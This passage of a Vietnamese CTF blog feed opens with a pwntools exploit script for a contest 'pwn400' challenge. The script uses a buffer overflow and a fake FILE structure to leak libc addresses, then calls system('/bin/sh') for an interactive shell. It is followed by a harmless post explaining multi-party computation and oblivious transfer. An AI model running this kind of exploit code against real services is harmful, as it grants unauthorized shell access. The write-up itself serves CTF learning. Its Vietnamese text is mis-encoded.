	s.sendline(str(len(content)))
	s.recvuntil("Give me the buffer: ")
	s.sendline(content)

name1 = "/tmp/abc"
name2 = "/tmp/def"
name3 = "/tmp/ghi"

name_addr = 0x804a0a0 + 16
puts_plt = 0x80485b0
puts_got = 0x804a01c
printf_got = 0x804a000
popret = 0x080486c3
start = 0x8048640

s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
#s = remote("118.70.80.143", 23504)
s.recvuntil("0:exit\n")

write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(puts_plt) + p32(popret) + p32(puts_got) + p32(puts_plt) + p32(popret) + p32(printf_got))

s.close()

#s = remote("118.70.80.143", 23504)
s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
s.recvuntil("0:exit\n")

fake_file = "\x00"*4*1 + p32(0xa1) + "\x00"*4*1              # 2 blocks
fake_file += p32(puts_plt) + "\x00"*4*16         # 17 blocks
fake_file += p32(name_addr) + "\x00"*4*14        # 15 blocks
fake_file += p32(name_addr + 38*4) + "\x00"*4*2    # 3 blocks
fake_file += p32(name_addr + 38*4)                 # 1 blocks
fake_file += p32(name_addr - 4) + "\x00"*4*1     # 2 blocks
fake_file += p32(0x20b59)                        # 1 blocks
fake_file += p32(name_addr + 30*4)                 # 1 blocks
fake_file += p32(name_addr + 34*4)

payload1 = name1 + fake_file
read_file(payload1)
data = s.recv()
data += s.recv()

puts = u32(data.split('\n')[-3][:4])
printf = u32(data.split('\n')[-2][:4])
log.info("Puts: " + hex(puts))
log.info("Printf: " + hex(printf))

s.close()

system = printf - 0x00049590 + 0x0003ad80
binsh = printf - 0x00049590 + 0x15ba3f

s = remote("localhost", 4000)
#s = remote("103.237.99.25",  23504)
#s = remote("118.70.80.143", 23504)
s.recvuntil("0:exit\n")

write_file(name1, "a"*260 + p32(name_addr) + "a"*12 + p32(system) + p32(popret) + p32(binsh))

s.close()

#s = remote("103.237.99.25",  23504)
s = remote("localhost", 4000)
s.recvuntil("0:exit\n")
read_file(payload1)
s.interactive()
</pre>
<p>TÃ´i hÃ­ há»­ng exploit vá»›i con server cá»§a há», ngá» Ä‘Ã¢u nÃ³ cháº¿t khÃ´ng thÆ°Æ¡ng tiáº¿c <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?ssl=1"><img data-attachment-id="586" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beat_brick/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beat_brick" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?fit=128%2C128&amp;ssl=1" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/beat_brick.png?resize=36%2C36&#038;ssl=1" alt="beat_brick" width="36" height="36" class="alignnone size-full wp-image-586" data-recalc-dims="1" /></a>. Äá» Ä‘áº«n má»™t lÃºc khÃ´ng hiá»ƒu chuyá»‡n gÃ¬ xáº£y ra, tÃ´i má»›i thá»­ Ä‘em sang má»™t mÃ¡y khÃ¡c cháº¡y báº£n ubuntu cÅ© hÆ¡n tÃ´i, vÃ  nÃ³ cÅ©ng chá»‹u chung sá»‘ pháº­n. CÃ³ váº» libc á»Ÿ báº£n cÅ© vÃ  báº£n má»›i khÃ¡c nhau ( cÃ¡ch xá»­ lÃ½, offset, ... ). LÃºc Ä‘Ã³ lÃ  2h Ä‘Ãªm vÃ  nghÄ© Ä‘áº¿n viá»‡c giá» ngá»“i debug láº¡i trÃªn libc-2.19 lÃ  tÃ´i láº¡i muá»‘n Ä‘i ... Ã <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=36%2C36&#038;ssl=1" alt="boss" width="36" height="36" class="alignnone size-full wp-image-565" data-recalc-dims="1" /></a>. TÃ´i tháº§m máº¯ng chá»­i ban tá»• chá»©c, láº½ ra pháº£i Ä‘Æ°a cáº£ libc cho ngÆ°á»i chÆ¡i chá»©, nhÆ°ng rá»“i láº¡i nháº­n ra, cÃ³ láº½ há» cÅ©ng khÃ´ng biáº¿t Ä‘Æ°á»£c Ä‘iá»u Ä‘Ã³ xáº£y ra, cÅ©ng giá»‘ng mÃ¬nh ban nÃ£y váº­y.</p>
<p>Váº­y lÃ  tÃ´i Ä‘Ã£ Ä‘Ã¡nh máº¥t 400 Ä‘iá»ƒm dÃ¹ nÃ³ Ä‘Ã£ náº±m trong tay, cáº£m giÃ¡c tháº­t giá»‘ng vá»›i viá»‡c tá»‘i Ä‘Ã£ Ä‘á»ƒ tuá»™t máº¥t tay HÃ­p khi váº«n cÃ²n Ä‘ang náº¯m cháº·t váº­y ...</p>
]]></content:encoded>
							<wfw:commentRss>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
						<post-id xmlns="com-wordpress:feed-additions:1">600</post-id>	</item>
		<item>
		<title>An toÃ n tÃ­nh toÃ¡n Ä‘a thÃ nh viÃªn</title>
		<link>https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/</link>
				<pubDate>Wed, 07 Sep 2016 11:24:32 +0000</pubDate>
		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
				<category><![CDATA[chuymich]]></category>
		<category><![CDATA[crypto]]></category>
		<category><![CDATA[research]]></category>
		<category><![CDATA[vietnamese]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=557</guid>
				<description><![CDATA[Multi-Party Computation (MPC) lÃ  má»™t khÃ¡i niá»‡m Ä‘Æ°á»£c cÃ¡c nhÃ  máº­t mÃ£ há»c Ä‘áº¯n Ä‘o nghiÃªn cá»©u táº­n nhá»¯ng tháº­p niÃªn 80 tháº¿ ká»· trÆ°á»›c. Xuáº¥t phÃ¡t tá»± nhiÃªn tá»« nhá»¯ng bÃ i toÃ¡n há»c bÃºa trongÂ cuá»™c sá»‘ng pháº£i Ä‘áº·t ra má»™t giao thá»©c hay ho hÆ¡n Ä‘á»ƒ Ä‘Ã¡nh Ä‘á»‘ nhau. VÃ­ dá»¥ nÄƒm 1982 Ä‘Ã³ &#8230; <a href="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/" class="more-link">Continue reading <span class="screen-reader-text">An toÃ n tÃ­nh toÃ¡n Ä‘a thÃ nh viÃªn</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p><strong>Multi-Party Computation (MPC)</strong> lÃ  má»™t khÃ¡i niá»‡m Ä‘Æ°á»£c cÃ¡c nhÃ  máº­t mÃ£ há»c Ä‘áº¯n Ä‘o nghiÃªn cá»©u táº­n nhá»¯ng tháº­p niÃªn 80 tháº¿ ká»· trÆ°á»›c. Xuáº¥t phÃ¡t tá»± nhiÃªn tá»« nhá»¯ng bÃ i toÃ¡n há»c bÃºa trongÂ cuá»™c sá»‘ng pháº£i Ä‘áº·t ra má»™t giao thá»©c hay ho hÆ¡n Ä‘á»ƒ Ä‘Ã¡nh Ä‘á»‘ nhau. VÃ­ dá»¥ nÄƒm 1982 Ä‘Ã³ lÃ  bÃ i toÃ¡n triá»‡u phÃº cá»§a anh Yao (1982 <a title="Andrew Yao" href="https://en.wikipedia.org/wiki/Andrew_Yao">Andrew Yao</a>Â  1), diá»…n NÃ´mÂ Ä‘Æ¡n giáº£n lÃ  anh Bin cÃ³ sá»‘ A tiá»n, cÃ²n anh Job cÃ³ sá»‘ B tiá»n. Hai anh trong má»™t cuá»™c nháº­u lá»¡ thÃ¡ch nhau xem ai cÃ³ nhiá»u tiá»n hÆ¡n ai <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>. NhÆ°ng hai anh Ä‘á»u khÃ´ng muá»‘n lá»™ raÂ tá»•ng sá»‘ tiá»n mÃ¬nh cÃ³ cho nhau biáº¿t. Do Ä‘Ã³ má»›i náº£y sinh bÃ i toÃ n chá»©ng minh báº¥t Ä‘áº³ng thá»©c AÂ â‰¥ B mÃ  khÃ´ng lá»™ thÃ´ng tin nÃ o cá»§a A vÃ  B cho báº¥t cá»© ai, ká»ƒ cáº£ 2 anh Bin vÃ  anh Jobs. Giáº£i quyáº¿t xong bÃ i toÃ n nÃ y Ä‘Ã£ má»Ÿ ra má»™t ká»· nguyÃªn má»›i cho báº£o máº­t thÃ´ng tin Ä‘áº·c biá»‡t lÃ  thÆ°Æ¡ng mai Ä‘iá»‡n tá»­, data mining khi muá»‘n so sÃ¡nh cÃ¡c giÃ¡ trá»‹, tÃ­nh toÃ¡n cá»™ng trá»« nhÃ¢n chia mÃ  váº«n báº£o vá»‡ Ä‘Æ°á»£c thÃ´ng tin máº­t nhÆ° sá»‘ tiá»n, tá»•ng tiá»n trong tÃ i khoáº£n khÃ¡ch hÃ ng, thÃ´ng tin nhÃ¢n kháº©u há»c v.v.</p>
<p><span id="more-557"></span></p>
<p><strong>1. MPC</strong></p>
<p>Tá»•ng quÃ¡t hÃ³a bÃ i toÃ¡n cá»§a Yao Ä‘Ã³ lÃ : giáº£ sá»­ cÃ³ n thÃ nh viÃªnÂ  <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_80a9c7eae10390d097c7698419f4e3ac.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> báº£o máº­t cho n giÃ¡ trá»‹ tÆ°Æ¡ng á»©ngÂ <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_391e71aa9bce9e9078443200ea5c76a5.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, vÃ  táº¥t cáº£ cÃ¡c thÃ nh viÃªn thá»±c hiá»‡nÂ phÃ©p tÃ­nhÂ <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_a722b10a2cc25a31b0c1067d8a2854fc.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> sao cho cÃ¡c giÃ¡ trá»‹Â <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_391e71aa9bce9e9078443200ea5c76a5.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> Ä‘Æ°á»£c báº£o máº­t hoÃ n toÃ n. Trong Ä‘á»‹nh nghÄ©a nÃ y, bÃ i toÃ¡nÂ cá»§a Yao lÃ  trÆ°á»ng há»£p nhá» vá»›i <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_c303081f7a16f603112b0375bdc84883.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> vÃ Â phÃ©p tÃ­nhÂ <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_345e1346b4e1502a8d3742870700eb0a.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
<p>VÃ­ dá»¥ thá»© hai Ä‘Ã³ lÃ  trÃ² chÆ¡i tÃ¬nh yÃªu, nhÆ° cÃ¡c báº¡n Ä‘á»c biáº¿t <a href="http://ctf.yeuchimse.com">yeuchimse</a>Â lÃ  má»™t thanh niÃªn á»§y má»‹ Æ°á»›t Ã¡t,Â sáº¿n rá»‡n hayÂ nghÄ© lung tung. Sáº» Ä‘á»‡ láº§n Ä‘áº§u tiÃªn khÃ´ng dÃ¡m tá» tÃ¬nh vÃ¬ sá»£ ngÆ°á»i áº¥y khÃ´ng thÃ­ch mÃ¬nh thÃ¬ tháº­t lÃ  quÃª Ä‘á»™ nÃªn Ä‘Ã£Â yÃªu cáº§u <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdepÂ </a>thiáº¿t káº¿ má»™t giao thá»©c sao cho:</p>
<ul>
<li><strong> Eligibility</strong>: Ä‘Æ°á»£c thá»• lá»™ vÃ  chá»‰ thá»• lá»™ mÃ´t láº§n.</li>
<li><strong>Privacy</strong>: Ä‘áº£m báº£o khÃ´ng lá»™ thÃ´ng tin Ä‘Ã£ thá»• lá»™ cho báº¥t ká»³ ai biáº¿t, cho dÃ¹ Ä‘Ã³ lÃ  ngÆ°á»i áº¥y hay chÃ­nhÂ <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdepÂ </a></li>
<li><strong>Universal Verifiability</strong>: ai cÅ©ng cÃ³ thá»ƒ check Ä‘Æ°á»£c káº¿t quáº£ lÃ  2 Ä‘á»©a nÃ³ cÃ³ Ä‘áº¿n Ä‘Æ°á»£c vá»›i nhau hay khÃ´ng Ä‘á»ƒ Ä‘áº£m báº£o tÃ­nh cÃ´ng báº±ng cá»§a cuá»™c chÆ¡i tÃ¬nh Ã¡i.</li>
<li><strong>Robustness</strong>: Má»i hÃ nh Ä‘á»™ng gian trÃ¡ vÃ­ dá»¥ nhÆ° thá»• lá»™ cÃ³ yÃªu sau Ä‘Ã³ láº¡i thay Ä‘á»•i Ã½ kiáº¿n lÃ  khÃ´ng yÃªu Ä‘á»u bá»‹ cáº¥m.</li>
</ul>
<p>4Â tiá»n Ä‘á» trÃªn cÃ¡c báº¡n Ä‘á»c nÃ o thÃ´ng minh cÃ³ thá»ƒ Ã¡p dá»¥ng vÃ o báº§u cá»­ Ä‘iá»‡n tá»­, tuy nhiÃªn giao thá»©cÂ <a href="https://www.facebook.com/profile.php?id=100009514863101">chuymichxinhdepÂ </a>thiáº¿t káº¿ dÆ°á»›i Ä‘Ã¢y sau nÃ y Ä‘Æ°á»£c biáº¿t Ä‘áº¿n rá»™ng rÃ£i dÆ°á»›i cÃ¡i tÃªnÂ  Five-Card Trick (Bert den Boer, Eurocrypt 1989) nhÆ° sau:</p>
<figure id="attachment_560" aria-describedby="caption-attachment-560" style="width: 524px" class="wp-caption aligncenter"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?ssl=1"><img data-attachment-id="560" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=524%2C297&amp;ssl=1" data-orig-size="524,297" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=300%2C170&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?fit=524%2C297&amp;ssl=1" class="wp-image-560 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?resize=524%2C297&#038;ssl=1" alt="Five-Card Trick (Bert den Boer, Eurocrypt 1989)" width="524" height="297" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?w=524&amp;ssl=1 524w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled.png?resize=300%2C170&amp;ssl=1 300w" sizes="(max-width: 524px) 100vw, 524px" data-recalc-dims="1" /></a><figcaption id="caption-attachment-560" class="wp-caption-text">Five-Card Trick (Bert den Boer, Eurocrypt 1989)</figcaption></figure>
<p>Vá»›i 5 lÃ¡ bÃ i Ãt, máº·c Ä‘á»‹nh má»™t chiáº¿c lÃ¡ Ãt cÆ¡ Ä‘á» Ä‘áº·t sáºµn trÃªn bÃ n. Vá»›i cÃ¡c cÃ¢u tráº£ lá»i giá»¯a 2 ngÆ°á»i tham gia trÃ² chÆ¡i lÃ  YÃªu hoáº·c khÃ´ng YÃªu tÆ°Æ¡ng á»©ng vá»›i 2 cÃ¡ch xáº¿p bÃ i Ãt cÆ¡, Ãt bÃ­ch. Sau khi Ä‘áº·t bÃ i xuá»‘ng bÃ n (cÃ³ thá»ƒ thay Ä‘á»•i chiá»u hÃ ng 5 bÃ i Ä‘á»ƒ khÃ´ng ai biáº¿t cÃ¢u tráº£ lá»i cá»§a mÃ¬nh á»Ÿ bÃªn nÃ o) thÃ¬ káº¿t quáº£ cáº£ 2 ngÆ°á»i Ä‘á»u cÃ³ cáº£m tÃ¬nh vá»›i nhau chá»‰ xáº£y ra khi cÃ³ 3 quÃ¢n Ãt cÆ¡ náº±m cáº¡nh nhau. TrÆ°á»ng há»£p káº¿t quáº£ 2 ngÆ°á»i khÃ´ng há»£p nhau thÃ¬ váº«n Ä‘áº£m báº£o cÃ´ gÃ¡i khÃ´ng biáº¿t Ä‘Æ°á»£c Ä‘á»‘i phÆ°Æ¡ng tráº£ lá»i lÃ  YÃªu hay khÃ´ng YÃªu. (Tháº­t lÃ  vi diá»‡u pháº£i khÃ´ng? <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img class="alignnone wp-image-565" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=25%2C25&#038;ssl=1" alt="boss" width="25" height="25" data-recalc-dims="1" /></a>)</p>
<p>Äá»ƒ giáº£i thÃ­ch cÃ¡ch giáº£i nÃ y, thá»±c cháº¥t Ä‘Ã³ chÃ­nh lÃ  báº£ng AND toÃ¡n tá»­ á»Ÿ báº£ng nÃ y:</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?ssl=1"><img data-attachment-id="561" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-2/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=330%2C80&amp;ssl=1" data-orig-size="330,80" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=300%2C73&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?fit=330%2C80&amp;ssl=1" class="size-medium wp-image-561 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?resize=300%2C73&#038;ssl=1" alt="Untitled" width="300" height="73" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?resize=300%2C73&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-1.png?w=330&amp;ssl=1 330w" sizes="(max-width: 300px) 100vw, 300px" data-recalc-dims="1" /></a></p>
<p>Káº¿t quáº£ xy=1 thÃ¬ rÃµ khi vÃ  chá»‰ khi x=1 vÃ  y=1. CÃ²n vá»›i xy=0 thÃ¬ ta chá»‰ káº¿t luáº­n cÃ³ 1 trong x hoáº·cÂ y tráº£ lá»i 0 mÃ  khÃ´ng thá»ƒ kháº³ng Ä‘á»‹nh rÃµ ai tráº£ lá»i 0 hay 1.Â Káº¿t quáº£ láº§n thá»±c nghiá»‡m protocol Ä‘Ã³ nhÆ° cÃ¡c báº¡n Ä‘Ã£ biáº¿t,Â cuá»™c sá»‘ngÂ rÃ¢Ìt Ã´Ì€n aÌ€o, cÃ³ nhá»¯ng káº» tháº¥t tÃ¬nh khÃ´ng biáº¿tÂ trÃ´Ìn vaÌ€o Ä‘Ã¢u Ä‘ÃªÌ‰ ngÃ´Ì€i mÃ´Ì£t miÌ€nh vaÌ€ tiÌ€m sÆ°Ì£ tiÌƒnh lÄƒÌ£ng cho riÃªng miÌ€nhÂ nÃªn Ä‘Ã nh chÆ¡i CTF.Â â€œEm chÆ°a lÃ¢Ìy chÃ´Ì€ng laÌ€ lÃ´Ìƒi cuÌ‰a anh!â€. Vá»›iÂ love game thÃ¬Â Ä‘en báº¡c cÃ²n Ä‘á» tÃ¬nh nhÆ°ng <a href="http://ctf.yeuchimse.com">yeuchimse</a>Â Ä‘en thÃ´i, Ä‘á» váº«n váº­y.Â <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?ssl=1"><img data-attachment-id="564" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/beauty/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="beauty" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-564" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/beauty.png?resize=26%2C26&#038;ssl=1" alt="beauty" width="26" height="26" data-recalc-dims="1" /></a></p>
<p><strong>2. OT</strong></p>
<p>Äá»ƒ hÃ³c bÃºa hÆ¡n, ngÆ°á»i ta Ä‘Ã£ phÃ¡t minh ra giao thá»©c ráº¥t hay ho Ä‘Ã³ lÃ  Chuyá»ƒnÂ giao khÃ´ng lá»™Â thÃ´ng tin ( Oblivious Transfer ) Ä‘Æ¡n giáº£n tháº¿ nÃ y: Â Anh Mao giá»¯ 2 giÃ¡ trá»‹Â <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9865b118af4cfc107929ec116ab9eb80.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> lÃ  bÃ­t tá»©c lÃ  chá»‰ cÃ³ 0 hoáº·c 1, chá»‹ MaiAnh giá»¯ má»™t giÃ¡ trá»‹ secret s, táº¥t nhiÃªn, cÅ©ng chá»‰ lÃ  bÃ­t 01. Chá»‹ chá»n má»™t sá»‘ u ngáº«u nhiÃªn khÃ¡ to trong táº­p nguyÃªn <strong>Z</strong> vÃ  chá»‹ tÃ­nh <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7cb433fd43ea022f61fa76e4d73a28d8.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> vá»›i <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7997a21e02329ca6c6bc77e68e43277e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Do <em>s</em> lÃ  bit nÃªn lÃºc nÃ y chá»‹ cÃ³ 2 giÃ¡ trá»‹ <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_f6bf330e68e6b2523ee18338347b8e2a.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, chá»‹Â gá»­i cáº£ 2 giÃ¡ trá»‹ nÃ y láº¡i cho Mao vá»›i má»¥c Ä‘Ã­ch lÃ m Mao khÃ´ng biáº¿t giÃ¡ trá»‹ <em>u, s</em> lÃ  gÃ¬, ká»ƒ cáº£ giÃ¡ trá»‹ <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b2f5ff47436671b6e533d8dc3614845d.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> á»Ÿ Ä‘Ã¢y lÃ  generator chung mÃ  cáº£ 2 Ä‘á»u biáº¿t, thÃ¬ theo báº¡n <a href="https://en.wikipedia.org/wiki/ElGamal_encryption">ElGamalÂ </a>Ä‘á»‘iÂ vá»›i mÃ¡y tÃ­nh cá»• lá»— cá»§a Mao lÃ  con MBP 15 inch Ä‘á»i giá»¯a 2015, tá»›i lÃºc bá»‘c má»™Â cÅ©ng khÃ´ng giáº£i ra Ä‘Æ°á»£cÂ <em>u</em> (Ã  mÃ  vá»›i Ä‘iá»u kiá»‡n lÃ  chá»‹ MaiAnh cÃ³ <em>u</em> ráº¥t to nhÃ©). Sau bÆ°á»›c nÃ y thÃ¬ Mao chá»nÂ 2 giÃ¡ trá»‹ <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_53dd2b7a99cd54e0d6febbc311e5b554.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> cÅ©ng ngáº«u nhiÃªn trong táº­p nguyÃªn Ä‘á»ƒÂ tÃ­nh má»™t phÆ°Æ¡ng trÃ¬nh phá»©c táº¡p hÆ¡n Ä‘Ã³ lÃ :</p>
<p><span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ae26caf67145aba703126c109d33ea19.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
